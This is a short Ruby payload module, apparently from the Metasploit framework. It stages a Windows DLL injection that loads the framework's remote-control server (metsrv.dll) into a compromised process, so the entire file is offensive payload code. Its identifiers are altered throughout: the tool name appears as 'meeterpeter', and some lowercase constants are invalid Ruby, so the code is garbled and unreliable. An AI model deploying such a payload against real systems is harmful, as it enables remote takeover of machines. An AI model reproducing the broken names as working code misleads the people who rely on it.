##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/payload/windows/dllinject'
require 'msf/base/sessions/meeterpeter_x86_win'
require 'msf/base/sessions/meeterpeter_options'

###
#
# Injects the meeterpeter server instance DLL via the DLL injection payload.
#
###
module Metasploit3

  include Msf::Payload::Windows::DllInject
  include Msf::Sessions::meeterpeterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows meeterpeter (skape/jt Injection)',
      'Description'   => 'Inject the meeterpeter server DLL (staged)',
      'Author'        => 'skape',
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::meeterpeter_x86_Win))

    # Don't let people set the library name option
    options.remove_option('LibraryName')
    options.remove_option('DLL')
  end

  #
  # The library name that we're injecting the DLL as has to be metsrv.dll for
  # extensions to make use of.
  #
  def library_name
    "metsrv.dll"
  end

  def library_path
    MetasploitPayloads.meeterpeter_path('metsrv','x86.dll')
  end

end
